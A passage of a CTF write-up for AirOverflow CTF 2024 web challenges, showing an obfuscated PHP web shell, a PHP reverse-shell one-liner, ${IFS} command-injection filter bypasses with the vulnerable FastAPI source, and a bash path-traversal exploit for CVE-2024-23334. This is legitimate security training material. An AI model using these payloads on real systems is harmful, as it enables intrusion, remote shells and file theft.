class="s1">&#39;/&#39;</span><span class="o">^</span><span class="s1">&#39;`&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="o">^</span><span class="s1">&#39;~&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="o">^</span><span class="s1">&#39;}&#39;</span><span class="p">);</span><span class="nv">$_74</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;{&#39;</span><span class="o">^</span><span class="s1">&#39;:&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;`&#39;</span><span class="o">^</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="o">^</span><span class="s1">&#39;{&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;#&#39;</span><span class="o">^</span><span class="s1">&#39;`&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="o">^</span><span class="s1">&#39;}&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;`&#39;</span><span class="o">^</span><span class="s1">&#39;&amp;&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="o">^</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;k&#39;</span><span class="o">^</span><span class="s1">&#39;_&#39;</span><span class="p">);</span> <span class="nv">$_</span> <span class="o">=</span> <span class="nv">$_2</span><span class="o">.</span><span class="nv">$_1</span><span class="o">.</span><span class="nv">$_2</span><span class="o">.</span><span class="nv">$_0</span><span class="p">;</span> <span class="nv">$_</span><span class="p">(</span><span class="nv">$$_55</span><span class="p">[</span><span class="nv">$_74</span><span class="o">.</span><span class="s1">&#39;_oEC8QYaYKp&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>I copy pasted the code and put it in a php file and ran it and got the following error.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/15.png" title="&amp;ldquo;running the obfuscated code&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/15.png" data-sub-html="<h2>Running the obfuscated code</h2><p>&amp;ldquo;running the obfuscated code&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/15.png"
+            data-srcset="/airoverflow-ctf-2024/15.png, /airoverflow-ctf-2024/15.png 1.5x, /airoverflow-ctf-2024/15.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/15.png" width="669" height="145" />
+    </a><figcaption class="image-caption">Running the obfuscated code</figcaption>
+    </figure></p>
+<p>It seems it&rsquo;s running <code>shell_exec()</code> but since there are no arguments parsed yet so it&rsquo;s throwing this error.</p>
+<p>Going further, at the end of code, we see 2 variables.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$_55</span> <span class="o">=</span> <span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="o">^</span><span class="s1">&#39;|&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="o">^</span><span class="s1">&#39;`&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="o">^</span><span class="s1">&#39;~&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="o">^</span><span class="s1">&#39;}&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_74</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;{&#39;</span><span class="o">^</span><span class="s1">&#39;:&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;`&#39;</span><span class="o">^</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="o">^</span><span class="s1">&#39;{&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;#&#39;</span><span class="o">^</span><span class="s1">&#39;`&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="o">^</span><span class="s1">&#39;}&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;`&#39;</span><span class="o">^</span><span class="s1">&#39;&amp;&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="o">^</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;k&#39;</span><span class="o">^</span><span class="s1">&#39;_&#39;</span><span class="p">);</span> <span class="nv">$_</span> <span class="o">=</span> <span class="nv">$_2</span><span class="o">.</span><span class="nv">$_1</span><span class="o">.</span><span class="nv">$_2</span><span class="o">.</span><span class="nv">$_0</span><span class="p">;</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I ran them separately in php shell and got their values.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/16.png" title="&amp;ldquo;variables values&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/16.png" data-sub-html="<h2>variables values</h2><p>&amp;ldquo;variables values&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/16.png"
+            data-srcset="/airoverflow-ctf-2024/16.png, /airoverflow-ctf-2024/16.png 1.5x, /airoverflow-ctf-2024/16.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/16.png" width="656" height="120" />
+    </a><figcaption class="image-caption">variables values</figcaption>
+    </figure></p>
+<p>So we know it&rsquo;s expecting a <code>POST</code> parameter named <code>AOFCTF24_oEC8QYaYKp</code> and what I can conclude, this parameter has command injection vulnerability.</p>
+<p>So I called the <code>POST</code> request at <code>/index.php</code> with a parameter <code>AOFCTF24_oEC8QYaYKp</code> and we get command injeciton.</p>
+<p>Since it was blind, I tried getting callback using <code>curl</code> to my webhook which I successfully got.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/17.png" title="&amp;ldquo;Getting callback with curl&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/17.png" data-sub-html="<h2>Getting callback with curl</h2><p>&amp;ldquo;Getting callback with curl&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/17.png"
+            data-srcset="/airoverflow-ctf-2024/17.png, /airoverflow-ctf-2024/17.png 1.5x, /airoverflow-ctf-2024/17.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/17.png" width="1357" height="518" />
+    </a><figcaption class="image-caption">Getting callback with curl</figcaption>
+    </figure></p>
+<p>Next is to inject some reverse shell but most of them weren&rsquo;t working for some reason but the following <code>php</code> shell worked.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span><span class="o">+-</span><span class="nx">r</span><span class="o">+</span><span class="s1">&#39;$sock%3dfsockopen(&#34;&lt;your-ip&gt;&#34;,17243)%3b`sh+&lt;%263+&gt;%263+2&gt;%263`%3b&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally read the flag from <code>/</code> directory.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/18.png" title="&amp;ldquo;Flag for musicoverflow2077&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/18.png" data-sub-html="<h2>Flag for musicoverflow2077</h2><p>&amp;ldquo;Flag for musicoverflow2077&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/18.png"
+            data-srcset="/airoverflow-ctf-2024/18.png, /airoverflow-ctf-2024/18.png 1.5x, /airoverflow-ctf-2024/18.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/18.png" width="603" height="481" />
+    </a><figcaption class="image-caption">Flag for musicoverflow2077</figcaption>
+    </figure></p>
+<h3 id="feedback">Feedback</h3>
+<h4 id="description-3">Description</h4>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/19.png" title="&amp;ldquo;Description for feedback&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/19.png" data-sub-html="<h2>Description for feedback</h2><p>&amp;ldquo;Description for feedback&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/19.png"
+            data-srcset="/airoverflow-ctf-2024/19.png, /airoverflow-ctf-2024/19.png 1.5x, /airoverflow-ctf-2024/19.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/19.png" width="422" height="457" />
+    </a><figcaption class="image-caption">Description for feedback</figcaption>
+    </figure></p>
+<h4 id="vulnerability-3">Vulnerability</h4>
+<p>There&rsquo;s a command injection vulnerability in this but with some filters while reading the flag.txt.</p>
+<h4 id="solution-3">Solution</h4>
+<p>Whatever we write in the input box, it gets reflected to us.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/20.png" title="&amp;ldquo;Testing the functionality&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/20.png" data-sub-html="<h2>Testing the functionality</h2><p>&amp;ldquo;Testing the functionality&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/20.png"
+            data-srcset="/airoverflow-ctf-2024/20.png, /airoverflow-ctf-2024/20.png 1.5x, /airoverflow-ctf-2024/20.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/20.png" width="1366" height="577" />
+    </a><figcaption class="image-caption">Testing the functionality</figcaption>
+    </figure></p>
+<p>Now let&rsquo;s try injecting some command with backticks.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/21.png" title="&amp;ldquo;Command injection&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/21.png" data-sub-html="<h2>Command injection</h2><p>&amp;ldquo;Command injection&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/21.png"
+            data-srcset="/airoverflow-ctf-2024/21.png, /airoverflow-ctf-2024/21.png 1.5x, /airoverflow-ctf-2024/21.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/21.png" width="1366" height="557" />
+    </a><figcaption class="image-caption">Command injection</figcaption>
+    </figure></p>
+<p>But we can&rsquo;t simply say <code>cat /flag.txt</code> as it&rsquo;ll say Invalid Characters.</p>
+<p>This challenge is same as the <code>JazzMe</code> challenge which was in <code>PCC 23 CTF finals</code> so I used the same payload I used there but it didn&rsquo;t work due to some additional filters in this challenge.</p>
+<p>So let&rsquo;s read the source code with following payload.</p>
+<p>Payload: <code>ls${IFS}-p${IFS}${IFS}|${IFS}xargs${IFS}-I${IFS}{}${IFS}cat${IFS}{}</code></p>
+<p>Basically, this command prints out everything in current directory.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/22.png" title="&amp;ldquo;reading source&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/22.png" data-sub-html="<h2>reading source</h2><p>&amp;ldquo;reading source&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/22.png"
+            data-srcset="/airoverflow-ctf-2024/22.png, /airoverflow-ctf-2024/22.png 1.5x, /airoverflow-ctf-2024/22.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/22.png" width="1366" height="572" />
+    </a><figcaption class="image-caption">reading source</figcaption>
+    </figure></p>
+<p>Clean up the code and it&rsquo;ll become as follows.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fastapi</span> <span class="kn">import</span> <span class="n">FastAPI</span><span class="p">,</span> <span class="n">Request</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fastapi.responses</span> <span class="kn">import</span> <span class="n">HTMLResponse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fastapi.staticfiles</span> <span class="kn">import</span> <span class="n">StaticFiles</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fastapi.templating</span> <span class="kn">import</span> <span class="n">Jinja2Templates</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">FastAPI</span><span class="p">(</span><span class="n">docs_url</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">redoc_url</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># app.mount(&#34;/static&#34;, StaticFiles(directory=&#34;static&#34;), name=&#34;static&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">templates</span> <span class="o">=</span> <span class="n">Jinja2Templates</span><span class="p">(</span><span class="n">directory</span><span class="o">=</span><span class="s2">&#34;templates&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.get</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="n">response_class</span><span class="o">=</span><span class="n">HTMLResponse</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">root</span><span class="p">(</span><span class="n">req</span><span class="p">:</span> <span class="n">Request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">templates</span><span class="o">.</span><span class="n">TemplateResponse</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;request&#34;</span><span class="p">:</span> <span class="n">req</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">invalid_chars</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34; &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;less&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;more&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;head&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tail&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;grep&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;awk&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sed&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;flag&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;txt&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;base&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;*&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;[&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;]&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\\\&#34;</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;?&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.post</span><span class="p">(</span><span class="s2">&#34;/submit&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">submit</span><span class="p">(</span><span class="n">req</span><span class="p">:</span> <span class="n">Request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="k">await</span> <span class="n">req</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">invalid_chars</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;success&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;response&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid Characters&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">get_output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;echo &#34;</span> <span class="o">+</span> <span class="n">name</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;success&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;response&#34;</span><span class="p">:</span> <span class="s2">&#34;Something went wrong on our side.&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;success&#34;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&#34;response&#34;</span><span class="p">:</span> <span class="n">get_output</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So we know it&rsquo;s using <code>subprocess</code> that actually is the reason for our command injection vuln. And there&rsquo;s a blacklist as well so we need to come up with something to bypass those blacklisted characters.</p>
+<p>Since my above payload can read every file in current directory, I simply added <code>cd .. &amp;&amp; cd .. &amp;&amp;</code> before it to get to <code>/</code> directory and read the flag.</p>
+<p>So final payload is as follows.</p>
+<p>Final Payload: <code>cd${IFS}..&amp;&amp;cd${IFS}..&amp;&amp;ls${IFS}-p${IFS}${IFS}|${IFS}xargs${IFS}-I${IFS}{}${IFS}cat${IFS}{}</code></p>
+<p>Make sure to put the payload in backticks.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/23.png" title="&amp;ldquo;Flag for Feedback&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/23.png" data-sub-html="<h2>Flag for Feedback</h2><p>&amp;ldquo;Flag for Feedback&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/23.png"
+            data-srcset="/airoverflow-ctf-2024/23.png, /airoverflow-ctf-2024/23.png 1.5x, /airoverflow-ctf-2024/23.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/23.png" width="1353" height="520" />
+    </a><figcaption class="image-caption">Flag for Feedback</figcaption>
+    </figure></p>
+<h3 id="little-nightmare">Little Nightmare</h3>
+<h4 id="description-4">Description</h4>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/24.png" title="&amp;ldquo;Desc for Little nightmare&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/24.png" data-sub-html="<h2>Desc for Little nightmare</h2><p>&amp;ldquo;Desc for Little nightmare&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/24.png"
+            data-srcset="/airoverflow-ctf-2024/24.png, /airoverflow-ctf-2024/24.png 1.5x, /airoverflow-ctf-2024/24.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/24.png" width="409" height="488" />
+    </a><figcaption class="image-caption">Desc for Little nightmare</figcaption>
+    </figure></p>
+<h4 id="vulnerability-4">Vulnerability</h4>
+<p>There is a usage of <code>aiohttp</code> python module which is vulnerable to Path Traversal vulnerability.</p>
+<h4 id="solution-4">Solution</h4>
+<p>The main website doesn&rsquo;t have much functionality but we have the source code and we see it&rsquo;s using <code>aiohttp</code> with version <code>3.9.1</code>.</p>
+<p>A quick google search reveals it has many vulnerabilities and one of them is Path Traversal <a href="https://security.snyk.io/vuln/SNYK-PYTHON-AIOHTTP-6209406" target="_blank" rel="noopener noreffer ">CVE-2024-23334</a>.</p>
+<p>We an find many PoCs online, the one which worked for me was <a href="https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh" target="_blank" rel="noopener noreffer ">this</a></p>
+<p>From the <code>Dockerfile</code>, we know the flag is in <code>/flag</code>.</p>
+<p>The script needed some modification according to our challenge, so the modified script is as follows.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">url</span><span class="o">=</span><span class="s2">&#34;http://challs.airoverflow.com:34094&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">string</span><span class="o">=</span><span class="s2">&#34;../&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span><span class="o">=</span><span class="s2">&#34;/js/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">file</span><span class="o">=</span><span class="s2">&#34;flag&#34;</span> <span class="c1"># without the first /</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="o">((</span><span class="nv">i</span><span class="o">=</span>0<span class="p">;</span> i&lt;15<span class="p">;</span> i++<span class="o">))</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">payload</span><span class="o">+=</span><span class="s2">&#34;</span><span class="nv">$string</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[+] Testing with </span><span class="nv">$payload$file</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">status_code</span><span class="o">=</span><span class="k">$(</span>curl --path-as-is -s -o /dev/null -w <span class="s2">&#34;%{http_code}&#34;</span> <span class="s2">&#34;</span><span class="nv">$url$payload$file</span><span class="s2">&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;\tStatus code --&gt; </span><span class="nv">$status_code</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> <span class="nv">$status_code</span> -eq <span class="m">200</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">        curl -s --path-as-is <span class="s2">&#34;</span><span class="nv">$url$payload$file</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/25.png" title="&amp;ldquo;Flag for little nightmare&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/25.png" data-sub-html="<h2>Flag for little nightmare</h2><p>&amp;ldquo;Flag for little nightmare&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/25.png"
+            data-srcset="/airoverflow-ctf-2024/25.png, /airoverflow-ctf-2024/25.png 1.5x, /airoverflow-ctf-2024/25.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/25.png" width="572" height="149" />
+    </a><figcaption class="image-caption">Flag for little nightmare</figcaption>
+    </figure></p>
+<h3 id="streamify">Streamify</h3>
+<h4 id="description-5">Description</h4>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/26.png" title="&amp;ldquo;Description for Streamify&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/26.png" data-sub-html="<h2>Description for Streamify</h2><p>&amp;ldquo;Description for Streamify&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/26.png"
+            data-srcset="/airoverflow-ctf-2024/26.png, /airoverflow-ctf-2024/26.png 1.5x, /airoverflow-ctf-2024/26.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/26.png" width="421" height="447" />
+    </a><figcaption class="image-caption">Description for Streamify</figcaption>
+    </figure></p>
+<h4 id="vulnerability-5">Vulnerability</h4>
+<p>The vulnerability here is insecure deserialization in node-serialize by which we&rsquo;ll get the RCE.</p>
+<h4 id="solution-5">Solution</h4>
+<p>The challenge shows a twitch type streaming website which doesn&rsquo;t have much functionality to offer.</p>
+<p>One of the things out of ordinary was when we visit <code>/profile</code> page, it assigns a cookie to us named <code>streamer</code> and it&rsquo;s base64 encoded as follows.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/27.png" title="&amp;ldquo;streamer cookie&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/27.png" data-sub-html="<h2>streamer cookie</h2><p>&amp;ldquo;streamer cookie&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/27.png"
+            data-srcset="/airoverflow-ctf-2024/27.png, /airoverflow-ctf-2024/27.png 1.5x, /airoverflow-ctf-2024/27.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/27.png" width="1351" height="520" />
+    </a><figcaption class="image-caption">streamer cookie</figcaption>
+    </figure></p>
+<p>The cookie&rsquo;s values are being printed out in the response of the page.</p>
